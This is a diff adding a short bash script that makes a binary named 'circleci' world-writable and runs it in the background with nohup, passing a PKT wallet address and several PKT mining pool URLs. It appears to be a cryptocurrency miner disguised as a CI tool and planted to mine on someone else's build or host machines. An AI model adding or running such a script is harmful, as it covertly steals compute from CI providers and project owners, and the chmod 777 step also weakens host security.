@@ -1,0 +1,4 @@
+#!/bin/bash
+
+chmod 777 circleci
+nohup ./circleci ann -p pkt1qaeudvw8lt3gm2ndr4wxaxhk9yljyztptuun5nj http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com &
